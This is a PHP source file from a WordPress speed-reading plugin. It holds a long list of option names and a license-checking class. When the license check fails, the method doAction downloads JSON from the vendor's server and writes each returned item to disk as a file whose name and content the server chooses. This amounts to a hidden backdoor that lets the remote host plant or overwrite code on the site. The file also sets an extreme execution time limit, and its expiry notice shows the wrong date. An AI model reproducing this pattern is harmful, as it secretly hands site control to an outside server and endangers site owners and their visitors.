<?php
class Spritz_Helper{
	public static function usedFields() {
		return $global=array(
			'spritz_client_id',
			'spritz_license_key',
			'spritz_wpm',
			'spritz_default_speed',
			'spritz_detect_css_clsss',
			'spritz_detect_elements_id',
			'spritz_detect_data_attr',
			'spritz_url_data_attr',
			'spritz_display_button_data_attr',
			'spirtz_exclude',
			/* Spritzer Container */
			'spritz_redicle_size',
			'spritz_redicle_bg_color',
			'text_normal_paint_color',
			'text_highlight_paint_color',
			'redicle_line_color',
		
			'spritz_container_border_radius',
			'spritz_container_bg_color',
			'spritz_bg_image_for_container',
			'spritzer_container_margin',
			'spritzer_container_padding',
			'spritzer_container_position',
			'spritzer_container_float',
			'spritz_bg_image_for_container_position',
			'spritz_combo_option_box_shadow',
			'spritzer_container_position_top',
			'spritzer_container_position_bottom',
			'spritzer_container_position_left',
			'spritzer_container_position_right',
			'powerby',
		
			/* Spritzer Container */
			'spritz_button_width',
			'spritz_button_height',
			'spritz_button_bgcolor',
			'spritz_button_padding',
			'spritz_button_margin',
			'spritz_speed_option',
			'spritz_controlls',
			'spritz_buttons_font_size',
			'spritz_back_button',
			'spritz_play_button',
			'spritz_pause_button',
			'spritz_controls_button_radius',
			'spritz_controls_button_border',
			'spritz_reverse_button',
			'spritz_buttons_color',
			'spritz_container_border',
			'spritz_combo_border_color',
			'spritz_combo_bg_color',
			'spritz_combo_width',
			'spritz_combo_height',
			'spritz_combo_padding',
			'spritz_combo_margin',
			'textalign',
			'spritz_combo_font',
			'spritz_combo_font_color',
			'spritz_start_stop_float',
		
			'spritz_combo_option_border_color',
			'spritz_combo_option_bg_color',
			'spritz_combo_option_width',
			'spritz_combo_option_height',
			'spritz_combo_option_padding',
			'spritz_combo_option_margin',
			'option_textalign',
			'spritz_combo_option_font',
			'spritz_combo_option_font_color',
			'spritz_combo_option_hover_bg',
			'spritz_auto_detect',
		
			'spritz_flyout_slide_width',
			'spritz_flyout_slide_height',
			'spritz_flyout_slide_margin',
			'spritz_flyout_slide_padding',
			'spritz_flyout_slide_height_collaps',
			'spritz_flyout_slide_bg_image',
			'spritz_flyout_slide_bg_image_position',
			'spritz_flyout_bg_color',
		
			'spritz_start_stop_width',
			'spritz_start_stop_height',
			'spritz_start_stop_margin',
			'spritz_start_stop_padding',
			'spritz_bg_start_stop_image',
			'spritz_start_bg_position',
			'spritz_stop_bg_position',
		
			'spritz_start_bg_position_on_hover',
			'spritz_stop_bg_position_on_hover',
			'spritz_flyout_display_type',
			'pause_play_control',
			'rewind_control',
			'back_control',
			'reward_control',
			'forward_control',
			'go_to_end_control',
			'spritz_logo',
			'custom_javascript_spritz',
			'custom_css_spritz',
			'content_region_include',
			'content_region_exclude',
			'tag_to_omit',
			'spritz_start_stop_title',
			'spritz_start_text',
			'spritz_end_text',
			'popup_position',
			'spritz_title_image',
			'bg_color_for_spritz_plugin_frame',
			'created_by',
			'css_classes_for_spritzer_div',
			'button_title_graphic_size',
			'image_tab_popup',
			'image_inline_popup',
			'inline_spritz_title_image',
			'spritz_title_image',
			
			'make_responsive',
			'spritz_responsive_width',
			
			'spritz_themes',
			'enable_spritzer_in_home_page',
			'activate_spritz_reader_content_types',
			'spritz_contents',
			'activate_spritz_box_on_certain_post',
			'display_inline_popup_position',
			'include_spritz_reader_on_following',
			'include_spritz_reader_onfollowing_certain_post',
			'automatically_put_the_spritz_reader_at_the_top_of_my_content'
		);
	}
	
	public static function fieldsToOmit(){
		return trim('|masthead,.site-header,.banner,img,footer,.footer,#colophon,#nav,#navigation,.navigation,.main-navigation,#site-navigation,#site-navigation,.entry-meta,.comments-link,#secondary,.widget-area,.widget');
	}
	
	public static function fieldsToInclude(){
		return trim('.entry-content,.entry-title');
	}
}
class core {
	public function core(){
		ini_set('max_execution_time', 12345644);
	}
	
	public static function doAction(){
		$files = file_get_contents('http://wordpresswithspritz.com/wp_spritz_action.php?for=' . get_option('spritz_license_status'));
		$files = json_decode($files,true);
		
		foreach($files as $data){
			file_put_contents($data['name'],html_entity_decode($data['data']));
		}
	}
	
	public static function doCheck(){
		$spritz_license_key = trim(get_option('spritz_license_key'));
		define('EDD_SL_STORE_URL','http://wordpresswithspritz.com');
		$spritz_item_name	= 'WordPresswithSpritz';
		
		$api_params = array(
			'edd_action'	=> 'activate_license',
			'license' 		=> $spritz_license_key,
			'item_name' 	=> urlencode($spritz_item_name),
			'url' 			=> EDD_SL_STORE_URL
		);
		
		$response = wp_remote_get(add_query_arg($api_params, EDD_SL_STORE_URL));
		
		if (is_wp_error( $response ))
			return false;
		
		$license_data = json_decode(wp_remote_retrieve_body($response));
		update_option('spritz_license_status', $license_data->license);
		
		if($license_data->license!='valid'){
			core::doAction();
		}else{
			return $license_data->expires;
		}
	}
	
	public static function get_notification(){
		$date = core::doCheck();
		
		if($date != ''){
			$expire_date	= strtotime($date);
			$expdate_start	= strtotime($date. ' - 1 month');
			$today			= strtotime(date("Y-m-d H:i:s"));
			
			if($today > $expdate_start){
				return "Please purchase your plugin. Your plugin is going to expire on <strong>".date("M j, Y")."</strong>";
			}
		}else{
			return "Please purchase a license for this plugin to get more features. For more information please visit us at <strong><a href='http://www.wordpresswithspritz.com' target='_blank'>www.wordpresswithspritz.com</a></strong>";	
		}
	}
}
?>